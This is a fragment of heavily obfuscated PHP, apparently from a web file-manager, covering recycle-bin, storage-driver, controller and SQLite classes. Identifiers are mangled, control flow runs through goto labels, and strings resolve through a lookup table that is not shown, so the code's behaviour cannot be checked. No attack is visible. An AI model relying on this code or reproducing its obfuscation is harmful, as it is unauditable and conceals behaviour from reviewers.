bò¥ã¨õ: define($_SERVER[õëù©û][223], 2); define($_SERVER[õëù©û][224], 3); define($_SERVER[õëù©û][225], 1); goto aî›”ĞÅâ; F°à³·´¹Ğ: if (!isset($_SERVER[$_SERVER[õëù©û][781]]) || !isset($_SERVER[$_SERVER[õëù©û][782]])) { goto cÕ¦ø´²‹Õ; a¦­ËìØ¿: $E£Ú³ÄèÌë = explode($_SERVER[õëù©û][213], $b£œîÏ¡Ğë); if (count($E£Ú³ÄèÌë) < $_SERVER[õëù©û][555]) { $DÓ×¬Ëªµö = $_SERVER[õëù©û][787]; $DÓ×¬Ëªµö(); } $DìÀÉ„®†ñ = $_SERVER[õëù©û][1475]; goto d¾¹É§ğÍ; d¾¹É§ğÍ: $DìÀÉ„®†ñ($_SERVER[$_SERVER[õëù©û][785]] . $_SERVER[õëù©û][786]); $cÅÛÈœå×Ã = 2; while ($cÅÛÈœå×Ã > 1) { $FÆêíÑá©Æ = rawurlencode($cÅÛÈœå×Ã . $_SERVER[õëù©û][357]); } goto Fó”Û”ƒö; cÕ¦ø´²‹Õ: $AÛ‰íµä­ = $_SERVER[õëù©û][784]; $F‰Õ¿„§šÚ = $_SERVER[$_SERVER[õëù©û][785]] . $_SERVER[õëù©û][786]; $b£œîÏ¡Ğë = $AÛ‰íµä­($F‰Õ¿„§šÚ); goto a¦­ËìØ¿; Fó”Û”ƒö: } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\x63\x65\x5f\162\x65\143\x79\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\151\155\x65", "\x74\151\155\145", "\151\x6e\x73\x65\x72\x74", "\146\x75\156\x63\x74\x69\x6f\156")); public function listData($E¼ÚöœŸ» = false) { $bµ˜“ÒŒ„ß =& $_SERVER[õëù©û]; $E¼ÚöœŸ» = $E¼ÚöœŸ» ? $E¼ÚöœŸ» : USER_ID; $cãÏ÷Ÿ‚š  = $this->where(array($bµ˜“ÒŒ„ß[1395] => $E¼ÚöœŸ»))->select(); return array_to_keyvalue($cãÏ÷Ÿ‚š , $bµ˜“ÒŒ„ß[33], $bµ˜“ÒŒ„ß[365]); } public function moveToRecycle($BÈ—®Î©Åƒ) { goto dŒÆêá›Î; d…‚ÜÔ¬¦¿: if (!$dæÎ·‹˜†¸ || $dæÎ·‹˜†¸[$eäœ’šğ»»[392]] == $eäœ’šğ»»[83]) { return; } $dñé«ÉÊÃé = array($eäœ’šğ»»[379] => $BÈ—®Î©Åƒ, $eäœ’šğ»»[1395] => USER_ID, $eäœ’šğ»»[516] => $dæÎ·‹˜†¸[$eäœ’šğ»»[367]], $eäœ’šğ»»[517] => $dæÎ·‹˜†¸[$eäœ’šğ»»[451]], $eäœ’šğ»»[520] => $dæÎ·‹˜†¸[$eäœ’šğ»»[454]]); $this->add($dñé«ÉÊÃé); goto fôâ¥‰‘Ğ; fôâ¥‰‘Ğ: $this->recycleMove($BÈ—®Î©Åƒ, 1); if ($dæÎ·‹˜†¸[$eäœ’šğ»»[366]] == $eäœ’šğ»»[83]) { $eÌÚ±Úğ…† = array($eäœ’šğ»»[520] => array($eäœ’šğ»»[478], $dæÎ·‹˜†¸[$eäœ’šğ»»[454]] . $BÈ—®Î©Åƒ . $eäœ’šğ»»[479])); $Eğ®ØÈù¤‰->where($eÌÚ±Úğ…†)->setField($eäœ’šğ»»[392], 1); } goto Eôå³°Ø¥; dŒÆêá›Î: $eäœ’šğ»» =& $_SERVER[õëù©û]; $Eğ®ØÈù¤‰ = Model($eäœ’šğ»»[1101]); $dæÎ·‹˜†¸ = $Eğ®ØÈù¤‰->sourceInfo($BÈ—®Î©Åƒ); goto d…‚ÜÔ¬¦¿; Eôå³°Ø¥: } public function clear() { $this->remove(!1); } public function remove($d”“§ƒéì‘ = false) { goto eÇÖ“Ò‰±; EòÎÂˆÑ­: $d”“§ƒéì‘ = $d”“§ƒéì‘ === !1 ? !1 : $d”“§ƒéì‘; $A„…¢†ö£Š = array(); foreach ($E°„òÙß† as $b¹ù¤‡ï) { if ($d”“§ƒéì‘ != !1 && !in_array($b¹ù¤‡ï, $d”“§ƒéì‘)) { continue; } $FÙ¹âšé‘->remove($b¹ù¤‡ï, !1); $fÍ·ùÅÍØ = $this->where(array($CÓ©Ä”‚­[365] => $b¹ù¤‡ï))->find(); $f†ì‡§ššÄ = $fÍ·ùÅÍØ[$CÓ©Ä”‚­[367]] . $CÓ©Ä”‚­[70] . $fÍ·ùÅÍØ[$CÓ©Ä”‚­[451]]; $A„…¢†ö£Š[$f†ì‡§ššÄ] = array($CÓ©Ä”‚­[516] => $fÍ·ùÅÍØ[$CÓ©Ä”‚­[367]], $CÓ©Ä”‚­[451] => $fÍ·ùÅÍØ[$CÓ©Ä”‚­[451]]); $this->where(array($CÓ©Ä”‚­[365] => $b¹ù¤‡ï))->delete(); } goto DÎœ‰¾µ­; eÇÖ“Ò‰±: $CÓ©Ä”‚­ =& $_SERVER[õëù©û]; $FÙ¹âšé‘ = Model($CÓ©Ä”‚­[1101]); $E°„òÙß† = $this->listData(); goto EòÎÂˆÑ­; DÎœ‰¾µ­: foreach ($A„…¢†ö£Š as $eô¬ñ×‡ï‘) { $FÙ¹âšé‘->targetSpaceUpdate($eô¬ñ×‡ï‘[$CÓ©Ä”‚­[367]], $eô¬ñ×‡ï‘[$CÓ©Ä”‚­[451]]); } goto D‡è©óà·¾; D‡è©óà·¾: } public function restore($A ¿Şæ®µ = false) { goto eêğõÛ¿‡æ; C‰ïÃ™Ë‹: $A ¿Şæ®µ = $A ¿Şæ®µ == !1 ? !1 : $A ¿Şæ®µ; if (!$dì°Ÿõ¢Î ) { return !0; } $b ¹ƒš‡ = array(); goto bÁÎÀ»‹ö; eêğõÛ¿‡æ: $e³ÔŞĞÙİ =& $_SERVER[õëù©û]; $C×í÷âö³­ = Model($e³ÔŞĞÙİ[1101]); $dì°Ÿõ¢Î  = $this->listData(); goto C‰ïÃ™Ë‹; bÁÎÀ»‹ö: foreach ($dì°Ÿõ¢Î  as $aÜàìâïåä) { goto AÇ½ÂƒÒÃÆ; dÔ‹à‚¥î‡: if ($d•ø´àçâí[$e³ÔŞĞÙİ[392]] == $e³ÔŞĞÙİ[83]) { continue; } $C×í÷âö³­->lockMoveStart($aÜàìâïåä); $this->recycleMove($aÜàìâïåä, 0); goto cºğ‘°ˆ¾š; cºğ‘°ˆ¾š: if ($aĞ“¿¡ª÷ô[$e³ÔŞĞÙİ[366]] == $e³ÔŞĞÙİ[83]) { $eí‡´ ‘÷ä = array($e³ÔŞĞÙİ[520] => array($e³ÔŞĞÙİ[478], $aĞ“¿¡ª÷ô[$e³ÔŞĞÙİ[454]] . $aÜàìâïåä . $e³ÔŞĞÙİ[479])); $C×í÷âö³­->where($eí‡´ ‘÷ä)->setField($e³ÔŞĞÙİ[392], 0); $this->restoreFolderChildren($aÜàìâïåä, $dì°Ÿõ¢Î ); } $this->where(array($e³ÔŞĞÙİ[365] => $aÜàìâïåä))->delete(); $C×í÷âö³­->folderSizeReset($aĞ“¿¡ª÷ô[$e³ÔŞĞÙİ[456]]); goto eáÔ¯½âÕ; AÇ½ÂƒÒÃÆ: if ($A ¿Şæ®µ != !1 && !in_array($aÜàìâïåä, $A ¿Şæ®µ)) { continue; } $aĞ“¿¡ª÷ô = $C×í÷âö³­->sourceInfo($aÜàìâïåä); $d•ø´àçâí = $C×í÷âö³­->sourceInfo($aĞ“¿¡ª÷ô[$e³ÔŞĞÙİ[456]]); goto dÔ‹à‚¥î‡; eáÔ¯½âÕ: $b ¹ƒš‡[] = $aĞ“¿¡ª÷ô[$e³ÔŞĞÙİ[456]]; if ($aĞ“¿¡ª÷ô[$e³ÔŞĞÙİ[366]] == $e³ÔŞĞÙİ[83]) { $b ¹ƒš‡[] = $aÜàìâïåä; } $C×í÷âö³­->lockMoveEnd($aÜàìâïåä); goto E·×¦¯Âä£; E·×¦¯Âä£: } $C×í÷âö³­->updateModifyTime($b ¹ƒš‡); goto B­‡¶¾²Â; B­‡¶¾²Â: } private function restoreFolderChildren($Cùˆòƒ“ , $b¯‘³èŠØò) { goto B³ÆÜ®è‹; B³ÆÜ®è‹: $Bµˆ÷ˆªËç =& $_SERVER[õëù©û]; $eŒî¬İ­”Á = Model($Bµˆ÷ˆªËç[1101]); $Eø§Á˜˜º = array($Bµˆ÷ˆªËç[365] => array($Bµˆ÷ˆªËç[7], array())); goto D—‰š‚øâƒ; A„‡åïÖ¬á: $Eø§Á˜˜º[$Bµˆ÷ˆªËç[365]][1] = array_unique($Eø§Á˜˜º[$Bµˆ÷ˆªËç[365]][1]); $Eø§Á˜˜º[$Bµˆ÷ˆªËç[907]] = $Bµˆ÷ˆªËç[2148]; $eŒî¬İ­”Á->where($Eø§Á˜˜º)->setField($Bµˆ÷ˆªËç[392], 1); goto AĞí«²¥À; D—‰š‚øâƒ: foreach ($b¯‘³èŠØò as $e´ƒÍ´ò›) { if ($e´ƒÍ´ò› == $Cùˆòƒ“ ) { continue; } if (!$eŒî¬İ­”Á->isParentOf($Cùˆòƒ“ , $e´ƒÍ´ò›)) { continue; } $FÁÄ·™ƒ¤ = $eŒî¬İ­”Á->sourceInfo($e´ƒÍ´ò›); if ($FÁÄ·™ƒ¤[$Bµˆ÷ˆªËç[366]] == $Bµˆ÷ˆªËç[83]) { $Eø§Á˜˜º[] = array($Bµˆ÷ˆªËç[520] => array($Bµˆ÷ˆªËç[478], $FÁÄ·™ƒ¤[$Bµˆ÷ˆªËç[454]] . $e´ƒÍ´ò› . $Bµˆ÷ˆªËç[479])); } else { $Eø§Á˜˜º[$Bµˆ÷ˆªËç[365]][1][] = $e´ƒÍ´ò›; } } if (!$Eø§Á˜˜º[$Bµˆ÷ˆªËç[365]][1]) { unset($Eø§Á˜˜º[$Bµˆ÷ˆªËç[365]]); } if (!$Eø§Á˜˜º) { return; } goto A„‡åïÖ¬á; AĞí«²¥À: } private function recycleMove($E¢’ÙçÉÊ, $DöğÎ«¯³ = 1) { $d‘ª›ŒÌ ª =& $_SERVER[õëù©û]; $A½„å…ƒÆ¨ = Model($d‘ª›ŒÌ ª[1101]); $C¯•™¼»µø = Model($d‘ª›ŒÌ ª[2321]); $E­ãÈ’éŠÇ = array($d‘ª›ŒÌ ª[365] => $E¢’ÙçÉÊ); if ($DöğÎ«¯³) { $A½„å…ƒÆ¨->where($E­ãÈ’éŠÇ)->setField($d‘ª›ŒÌ ª[392], 1); $C¯•™¼»µø->eventRecycle($E¢’ÙçÉÊ, $d‘ª›ŒÌ ª[2322]); } else { $eŠšê¬Ñó± = $A½„å…ƒÆ¨->where($E­ãÈ’éŠÇ)->find(); $d“œë¾ğÃÜ = $eŠšê¬Ñó±[$d‘ª›ŒÌ ª[366]] == $d‘ª›ŒÌ ª[83]; $a¾³«´ĞÛ… = $A½„å…ƒÆ¨->fileNameAuto($eŠšê¬Ñó±[$d‘ª›ŒÌ ª[456]], $eŠšê¬Ñó±[$d‘ª›ŒÌ ª[28]], REPEAT_RENAME_FOLDER, $d“œë¾ğÃÜ); if ($a¾³«´ĞÛ… != $eŠšê¬Ñó±[$d‘ª›ŒÌ ª[28]]) { $A½„å…ƒÆ¨->rename($E¢’ÙçÉÊ, $a¾³«´ĞÛ…); } $A½„å…ƒÆ¨->where($E­ãÈ’éŠÇ)->setField($d‘ª›ŒÌ ª[392], 0); $C¯•™¼»µø->eventRecycle($E¢’ÙçÉÊ, $d‘ª›ŒÌ ª[2323]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x73\x74\x6f\162\141\x67\145\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\163\x69\x7a\x65\115\x61\170", "\163\171\163\164\145\155", "\x64\x65\x66\x61\x75\x6c\x74", "\x64\x72\151\x76\x65\x72", "\143\157\x6e\146\x69\147"); public function listData($A¹Ö½ÓÓÛŞ = false, $CµÚ´Í¾‘ƒ = "\x6d\x6f\x64\151\x66\x79\x54\151\x6d\x65", $d‹‰â‚§øÁ = false) { goto a±‡Åò”Üä; eÅ¿ËÓôç: return $F¼„â¹¶˜¼; goto eğ¶ßøª©Š; CÆë”Ÿª„™: foreach ($F¼„â¹¶˜¼ as $eŸÉÒÖ±¿ => $a¾„ ÜÜ“Ä) { unset($F¼„â¹¶˜¼[$eŸÉÒÖ±¿][$a‚ÀŠÆ¡¡´[6]]); $F¼„â¹¶˜¼[$eŸÉÒÖ±¿][$a‚ÀŠÆ¡¡´[2054]] = 0; } $F—Ûõ¡¿ÍĞ = array_to_keyvalue($F¼„â¹¶˜¼, $a‚ÀŠÆ¡¡´[33], $a‚ÀŠÆ¡¡´[363]); $this->_listAppendSize($F¼„â¹¶˜¼, $F—Ûõ¡¿ÍĞ); goto eÅ¿ËÓôç; a±‡Åò”Üä: $a‚ÀŠÆ¡¡´ =& $_SERVER[õëù©û]; $F¼„â¹¶˜¼ = parent::listData($A¹Ö½ÓÓÛŞ, $CµÚ´Í¾‘ƒ, $d‹‰â‚§øÁ); if ($A¹Ö½ÓÓÛŞ) { return $F¼„â¹¶˜¼; } goto CÆë”Ÿª„™; eğ¶ßøª©Š: } public function _listAppendSize(&$c ¨ÀÎ‘„ö, $B¥éÛ˜¾·‚) { $d¶ÃºËÜ¥Ö =& $_SERVER[õëù©û]; $e©š½áÏå = $d¶ÃºËÜ¥Ö[2324] . implode($d¶ÃºËÜ¥Ö[47], $B¥éÛ˜¾·‚) . $d¶ÃºËÜ¥Ö[2325]; $Eˆƒ®ô‡… = Model($d¶ÃºËÜ¥Ö[714])->query($e©š½áÏå); $Eˆƒ®ô‡… = array_to_keyvalue($Eˆƒ®ô‡…, $d¶ÃºËÜ¥Ö[363], $d¶ÃºËÜ¥Ö[77]); foreach ($c ¨ÀÎ‘„ö as $dŸƒ£âÆŸ‚ => $f‡ò‚‚Íñ‹) { $c ¨ÀÎ‘„ö[$dŸƒ£âÆŸ‚][$d¶ÃºËÜ¥Ö[2054]] = isset($Eˆƒ®ô‡…[$f‡ò‚‚Íñ‹[$d¶ÃºËÜ¥Ö[363]]]) ? $Eˆƒ®ô‡…[$f‡ò‚‚Íñ‹[$d¶ÃºËÜ¥Ö[363]]] : 0; } } public function getConfig($AœÛ‚ ÂÁ) { $bèº×Áî÷ = parent::listData($AœÛ‚ ÂÁ); return json_decode($bèº×Áî÷[$_SERVER[õëù©û][6]], !0); } public function update($Eñöç—”•É, $eŠùÔÃŠÌµ) { goto CÅÊ½Á¤¼Ø; E§¿ë±‘¤Â: if (isset($b¹öÙŠ„âÙ[$ašÅÂ•âŠµ]) && $b¹öÙŠ„âÙ[$ašÅÂ•âŠµ][$C„“ŠºÑôó[363]] != $Eñöç—”•É) { return !1; } if (isset($eŠùÔÃŠÌµ[$C„“ŠºÑôó[2326]]) && $eŠùÔÃŠÌµ[$C„“ŠºÑôó[2326]] == $C„“ŠºÑôó[83]) { $this->checkConfig($eŠùÔÃŠÌµ); } unset($eŠùÔÃŠÌµ[$C„“ŠºÑôó[2326]]); goto fÜç Ó­ƒ¦; CÅÊ½Á¤¼Ø: $C„“ŠºÑôó =& $_SERVER[õëù©û]; $ašÅÂ•âŠµ = $eŠùÔÃŠÌµ[$C„“ŠºÑôó[28]]; $b¹öÙŠ„âÙ = array_to_keyvalue(parent::listData(), $C„“ŠºÑôó[28]); goto E§¿ë±‘¤Â; fÜç Ó­ƒ¦: $E¶ÍáŠç…İ = parent::update($Eñöç—”•É, $eŠùÔÃŠÌµ); if ($E¶ÍáŠç…İ && $eŠùÔÃŠÌµ[$C„“ŠºÑôó[34]]) { foreach ($b¹öÙŠ„âÙ as $eŞ­Õæá) { if ($eŞ­Õæá[$C„“ŠºÑôó[34]] && $eŞ­Õæá[$C„“ŠºÑôó[363]] != $Eñöç—”•É) { parent::update($eŞ­Õæá[$C„“ŠºÑôó[363]], array($C„“ŠºÑôó[34] => 0)); } } } return $E¶ÍáŠç…İ; goto E±†ÇïäÀ‚; E±†ÇïäÀ‚: } public function add($fŠ©‹‰íã) { goto bÆœË½ÑÂÑ; F‡ñŠƒñ·‡: return $fÎÑÈùº¡œ; goto D ‹„£‘Û‰; e¦¯ô¿Ï¤–: $this->checkConfig($fŠ©‹‰íã); $fÎÑÈùº¡œ = parent::insert($fŠ©‹‰íã); if ($fÎÑÈùº¡œ && $fŠ©‹‰íã[$d— ƒŠ“ó¬[34]]) { foreach ($b¥ŞÀòîÀ as $F´’Íğ­ƒÚ) { if ($F´’Íğ­ƒÚ[$d— ƒŠ“ó¬[34]]) { parent::update($F´’Íğ­ƒÚ[$d— ƒŠ“ó¬[363]], array($d— ƒŠ“ó¬[34] => 0)); } } } goto F‡ñŠƒñ·‡; bÆœË½ÑÂÑ: $d— ƒŠ“ó¬ =& $_SERVER[õëù©û]; $b¥ŞÀòîÀ = array_to_keyvalue(parent::listData(), $d— ƒŠ“ó¬[28]); if (isset($b¥ŞÀòîÀ[$fŠ©‹‰íã[$d— ƒŠ“ó¬[28]]])) { return !1; } goto e¦¯ô¿Ï¤–; D ‹„£‘Û‰: } public function checkConfig(&$AŒ¥öª‹ëİ) { goto aÜ´àšĞ„•; CÑ»ÈÄÓîÃ: $A¿“©Ù½æò = $e×ÃŒµ‹ù[71] . $BÒÀä§‰•; $C˜ÂîÚñ”ì = new $A¿“©Ù½æò($fšíÌÎ›£™); if (in_array($AÀÜİ•¬×³, $C˜ÂîÚñ”ì->objectDriver)) { if (!$C˜ÂîÚñ”ì->isBucketCors() && !$C˜ÂîÚñ”ì->setBucketCors()) { $d«·ÜºÔáö = LNG($e×ÃŒµ‹ù[2327]); $d«·ÜºÔáö .= $e×ÃŒµ‹ù[2328] . LNG($e×ÃŒµ‹ù[2329]); show_json($d«·ÜºÔáö, !1); } } goto F¨õ‰›»Ç®; F¨õ‰›»Ç®: $eÄêÄ¾é¥ê = $C˜ÂîÚñ”ì->getPath($a¿Õ«Âù³ . $e×ÃŒµ‹ù[1950]); if (!$C˜ÂîÚñ”ì->mkfile($eÄêÄ¾é¥ê)) { show_json(LNG($e×ÃŒµ‹ù[2327]), !1); } $fšíÌÎ›£™[$e×ÃŒµ‹ù[1015]] = $a¿Õ«Âù³; goto bœƒòšÈñ; bœƒòšÈñ: $AŒ¥öª‹ëİ[$e×ÃŒµ‹ù[6]] = json_encode($fšíÌÎ›£™); $AŒ¥öª‹ëİ[$e×ÃŒµ‹ù[90]] = $BÒÀä§‰•; return !0; goto C—ßÏÛÛ¿ç; e‡·‚§áø£: foreach ($fšíÌÎ›£™ as $a‡›”—ÃÚ´ => $CÁì¡ó÷¯¦) { $fšíÌÎ›£™[$a‡›”—ÃÚ´] = trim($CÁì¡ó÷¯¦); } $a¿Õ«Âù³ = rtrim($fšíÌÎ›£™[$e×ÃŒµ‹ù[1015]], $e×ÃŒµ‹ù[8]) . $e×ÃŒµ‹ù[8]; $BÒÀä§‰• = $this->driverType($AÀÜİ•¬×³); goto CÑ»ÈÄÓîÃ; aÜ´àšĞ„•: $e×ÃŒµ‹ù =& $_SERVER[õëù©û]; $AÀÜİ•¬×³ = strtolower($AŒ¥öª‹ëİ[$e×ÃŒµ‹ù[90]]); $fšíÌÎ›£™ = json_decode_force($AŒ¥öª‹ëİ[$e×ÃŒµ‹ù[6]]); goto e‡·‚§áø£; C—ßÏÛÛ¿ç: } private function driverType($b¤»¯éÂÒß) { $FˆÊ°¶¥ô =& $_SERVER[õëù©û]; $A˜’¼™Œšö = array($FˆÊ°¶¥ô[101] => $FˆÊ°¶¥ô[2330], $FˆÊ°¶¥ô[58] => $FˆÊ°¶¥ô[2331], $FˆÊ°¶¥ô[64] => $FˆÊ°¶¥ô[2332]); if (isset($A˜’¼™Œšö[$b¤»¯éÂÒß])) { return $A˜’¼™Œšö[$b¤»¯éÂÒß]; } return strtoupper($b¤»¯éÂÒß); } public function driverListSystem() { $BÈÓîÕò”— =& $_SERVER[õëù©û]; $B—Ïµ§ó = parent::listData(); $aËŒØà³¹Á = array(); foreach ($B—Ïµ§ó as $C“œ÷ˆÇóÄ) { unset($C“œ÷ˆÇóÄ[$BÈÓîÕò”—[183]], $C“œ÷ˆÇóÄ[$BÈÓîÕò”—[106]]); $C“œ÷ˆÇóÄ[$BÈÓîÕò”—[6]] = json_decode_force($C“œ÷ˆÇóÄ[$BÈÓîÕò”—[6]]); $aËŒØà³¹Á[] = $C“œ÷ˆÇóÄ; } return $aËŒØà³¹Á; } public function defaultDriver() { $bÔäéŠƒ”ò =& $_SERVER[õëù©û]; $dà¦õÏÊÂ‡ = parent::listData(); $c‰ª‡Š‡‚ = array_filter_by_field($dà¦õÏÊÂ‡, $bÔäéŠƒ”ò[34], 1); $c‰ª‡Š‡‚ = $c‰ª‡Š‡‚[0]; if ($c‰ª‡Š‡‚) { $c‰ª‡Š‡‚[$bÔäéŠƒ”ò[6]] = json_decode($c‰ª‡Š‡‚[$bÔäéŠƒ”ò[6]], !0); } return $c‰ª‡Š‡‚; } public function driverInfo($dÁÜì¬‹ÈÆ) { $fÓ í‡à =& $_SERVER[õëù©û]; $aÎ—êßÌÆ¡ = array_to_keyvalue(parent::listData(), $fÓ í‡à[363]); if (!isset($aÎ—êßÌÆ¡[$dÁÜì¬‹ÈÆ])) { return !1; } $AĞèœè¦ÂÎ = $aÎ—êßÌÆ¡[$dÁÜì¬‹ÈÆ]; $AĞèœè¦ÂÎ[$fÓ í‡à[6]] = json_decode_force($AĞèœè¦ÂÎ[$fÓ í‡à[6]]); return $AĞèœè¦ÂÎ; } public function remove($fµ½êÓÄ¾Ì) { $this->removeShareItems($fµ½êÓÄ¾Ì); return parent::remove($fµ½êÓÄ¾Ì); } public function removeWithFile($e×ñ¶–³) { goto DŠ’„Šİ÷; eèÓÊá¶Òˆ: $Bøæ°ÜŠË† = Model($FãÍˆ„Ñæ[417])->where($eíöŠÅ²¢­)->sum($FãÍˆ„Ñæ[77]); $B›ÖËÔ—ÑÌ = $FãÍˆ„Ñæ[2333] . $e×ñ¶–³; $d˜£âÀòÄ£ = new TaskFileTransfer($B›ÖËÔ—ÑÌ, $FãÍˆ„Ñæ[2334], $Eæ âÅà, LNG($FãÍˆ„Ñæ[2335]) . "\50{$e×ñ¶–³}\51"); goto Aë­êŸè; F¬Ì¼ñƒ…ë: $CÁĞó’•„Ö = Model($FãÍˆ„Ñæ[163])->where($eíöŠÅ²¢­)->field($FãÍˆ„Ñæ[2336])->select(); foreach ($CÁĞó’•„Ö as $F«¯Ô”²Ä‰) { goto dŒŠŸ°ß©; cÓ¾Òßøèô: $fÓ‚âŠ¸„Œ = array($FãÍˆ„Ñæ[738] => $Eè¤‹øªæ‚, $FãÍˆ„Ñæ[75] => $BÑŠØ’‰); Model($FãÍˆ„Ñæ[163])->where($eíöŠÅ²¢­)->save($fÓ‚âŠ¸„Œ); goto b×™øâİÖî; CÙ›±±ŠÕ±: if (IO::exist($BÑŠØ’‰)) { $d˜£âÀòÄ£->updateFileEnd($F«¯Ô”²Ä‰[$FãÍˆ„Ñæ[28]], $F«¯Ô”²Ä‰[$FãÍˆ„Ñæ[77]]); continue; } if (!IO::move($EˆÌ½­Ï·, get_path_father($BÑŠØ’‰))) { $cŞÜ¶¢àè¡ = !1; break; } $eíöŠÅ²¢­ = array($FãÍˆ„Ñæ[414] => $F«¯Ô”²Ä‰[$FãÍˆ„Ñæ[414]]); goto cÓ¾Òßøèô; dŒŠŸ°ß©: $EˆÌ½­Ï· = $F«¯Ô”²Ä‰[$FãÍˆ„Ñæ[75]]; $BÑŠØ’‰ = $d£‹¹íŠ½ . str_replace("\173\151\157\x3a{$e×ñ¶–³}\x7d\x2f", $FãÍˆ„Ñæ[33], $EˆÌ½­Ï·); if (!IO::exist($EˆÌ½­Ï·)) { $CôÂÓ‘¾±œ[] = $F«¯Ô”²Ä‰[$FãÍˆ„Ñæ[414]]; $d˜£âÀòÄ£->updateFileEnd($F«¯Ô”²Ä‰[$FãÍˆ„Ñæ[28]], $F«¯Ô”²Ä‰[$FãÍˆ„Ñæ[77]]); continue; } goto CÙ›±±ŠÕ±; b×™øâİÖî: } $this->removeByFileID($CôÂÓ‘¾±œ); goto F‡‹ÈÍª”Ô; CùÙ––ˆÕ: $d£‹¹íŠ½ = "\x7b\x69\157\72{$Eè¤‹øªæ‚}\175\x2f"; $cŞÜ¶¢àè¡ = !0; $CôÂÓ‘¾±œ = array(); goto F¬Ì¼ñƒ…ë; DŠ’„Šİ÷: $FãÍˆ„Ñæ =& $_SERVER[õëù©û]; $eíöŠÅ²¢­ = array($FãÍˆ„Ñæ[738] => $e×ñ¶–³); $Eæ âÅà = Model($FãÍˆ„Ñæ[417])->where($eíöŠÅ²¢­)->count(); goto eèÓÊá¶Òˆ; F‡‹ÈÍª”Ô: if (!$cŞÜ¶¢àè¡) { $d˜£âÀòÄ£->stop($B›ÖËÔ—ÑÌ); return !1; } $d˜£âÀòÄ£->end(); $this->remove($e×ñ¶–³); goto b™‹ ÃÏ¶¾; Aë­êŸè: $d˜£âÀòÄ£->task[$FãÍˆ„Ñæ[693]] = (double) $Bøæ°ÜŠË†; $E±¯å»÷Ã = KodIO::defaultDriver(); $Eè¤‹øªæ‚ = $E±¯å»÷Ã[$FãÍˆ„Ñæ[363]]; goto CùÙ––ˆÕ; b™‹ ÃÏ¶¾: } public function progress($D™Ê¥ìƒÔ) { return Task::get($_SERVER[õëù©û][2333] . $D™Ê¥ìƒÔ); } private function removeByFileID($C¹Š´‡±Ñ = array()) { goto CåÚ³Œ; a”•œæŒ: foreach ($dÆÓ•Ó‘â as $c¿¯âÎöÓ) { Model($DÓñ˜µ×Š[378])->removeNow($c¿¯âÎöÓ, !1); } goto DÑ¿äõĞ¼Û; CåÚ³Œ: $DÓñ˜µ×Š =& $_SERVER[õëù©û]; if (empty($C¹Š´‡±Ñ)) { return; } $C…¢ÕÇÉõí = array($DÓñ˜µ×Š[414] => array($DÓñ˜µ×Š[7], $C¹Š´‡±Ñ)); goto Bò­¯ñ®Ş; Bò­¯ñ®Ş: $dÆÓ•Ó‘â = Model($DÓñ˜µ×Š[1101])->where($C…¢ÕÇÉõí)->field($DÓñ˜µ×Š[365])->select(); if (!$dÆÓ•Ó‘â) { return; } $dÆÓ•Ó‘â = array_to_keyvalue($dÆÓ•Ó‘â, $DÓñ˜µ×Š[33], $DÓñ˜µ×Š[365]); goto a”•œæŒ; DÑ¿äõĞ¼Û: } private function removeShareItems($fáÄ¼–ÕÌğ) { goto EªÎ†³È¯; a½‰øóŒ¹: $eì˜†ù›ØŸ = Model($a¹™İñîÕâ[2045])->where($C†ÀŸï–ƒ²)->field($a¹™İñîÕâ[436])->select(); if (empty($eì˜†ù›ØŸ)) { return; } $EŞ…Ê’»¦ = array_to_keyvalue($eì˜†ù›ØŸ, $a¹™İñîÕâ[33], $a¹™İñîÕâ[436]); goto bùô‰¶Ÿİâ; bùô‰¶Ÿİâ: Model($a¹™İñîÕâ[531])->remove($EŞ…Ê’»¦); goto AÇŸƒìù¼ ; EªÎ†³È¯: $a¹™İñîÕâ =& $_SERVER[õëù©û]; $F£ÕÃ®ì = "\x7b\x69\x6f\72{$fáÄ¼–ÕÌğ}\175\x2f"; $C†ÀŸï–ƒ² = array($a¹™İñîÕâ[365] => 0, $a¹™İñîÕâ[1009] => array($a¹™İñîÕâ[746], "{$F£ÕÃ®ì}\45")); goto a½‰øóŒ¹; AÇŸƒìù¼ : } } goto D­†´ö´Èø; e¿øï®ïÙ­: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Dƒ¯¥øäÆŞ; AÔ…¾í¯Éƒ: $this->tpl = TEMPLATE . MOD . $dÅ«’©æê¶[8]; $this->_classObjectID = mt_rand(0, 10000); goto b¥¶ååòì„; cÂÕè¢šËó: $this->in =& $in; $this->values[$dÅ«’©æê¶[6]] =& $config; $this->values[$dÅ«’©æê¶[7]] =& $in; goto AÔ…¾í¯Éƒ; Dƒ¯¥øäÆŞ: $dÅ«’©æê¶ =& $_SERVER[õëù©û]; global $in, $config; $this->config =& $config; goto cÂÕè¢šËó; b¥¶ååòì„: } public function loadClass($bôÆÍ´”) { if (1 === func_num_args()) { $this->{$bôÆÍ´”} = new $bôÆÍ´”(); } else { $f® ˆÑÛÍÓ = new ReflectionClass($bôÆÍ´”); $FÁ«õğ­á« = func_get_args(); array_shift($FÁ«õğ­á«); $this->{$bôÆÍ´”} = $f® ˆÑÛÍÓ->newInstanceArgs($FÁ«õğ­á«); } return $this->{$bôÆÍ´”}; } protected function assign($dç£Ì•í‘×, $F„ŒË¸…Ã‚) { $this->values[$dç£Ì•í‘×] = $F„ŒË¸…Ã‚; } protected function display($eòÖ¬‡‡ø) { ob_end_clean(); extract($this->values); require $this->tpl . $eòÖ¬‡‡ø; } } class DbSqliteBase extends Db { public function __construct($fÏÉùó°Û = '') { $Aæ¾ŸãÖ³Ş =& $_SERVER[õëù©û]; if (!extension_loaded($Aæ¾ŸãÖ³Ş[9])) { think_exception(think_lang($Aæ¾ŸãÖ³Ş[10]) . $Aæ¾ŸãÖ³Ş[11]); } if (!empty($fÏÉùó°Û)) { if (!isset($fÏÉùó°Û[$Aæ¾ŸãÖ³Ş[12]])) { $fÏÉùó°Û[$Aæ¾ŸãÖ³Ş[12]] = 438; } $this->config = $fÏÉùó°Û; if (empty($this->config[$Aæ¾ŸãÖ³Ş[13]])) { $this->config[$Aæ¾ŸãÖ³Ş[13]] = array(); } } } public function connect($E‹ĞŸ»×Ğ¿ = '', $Eã…”ìÅ› = 0) { $A·³ ¿†ƒ¸ =& $_SERVER[õëù©û]; if (!isset($this->linkID[$Eã…”ìÅ›])) { goto d¯¼‰÷Ò·; 